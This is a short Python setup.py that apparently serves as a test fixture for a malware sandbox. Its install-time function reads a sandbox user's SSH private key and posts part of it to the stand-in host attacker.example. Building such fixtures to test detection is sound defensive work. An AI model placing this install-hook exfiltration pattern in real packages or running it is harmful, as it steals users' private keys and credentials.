"""Deliberately suspicious package setup used for sandbox tests.

This file must only be executed inside the shadow sandbox.
"""

from __future__ import annotations

from setuptools import setup


def suspicious_probe() -> None:
    data = ""
    try:
        with open("/home/sandbox/.ssh/id_rsa", "r", encoding="utf-8", errors="replace") as handle:
            data = handle.read()[:80]
    except Exception:
        data = "credential_read_failed"

    try:
        import requests

        requests.post("https://attacker.example/upload", data={"probe": data}, timeout=2)
    except Exception:
        pass


suspicious_probe()

setup(name="malicious-package-demo", version="0.0.1", py_modules=[])
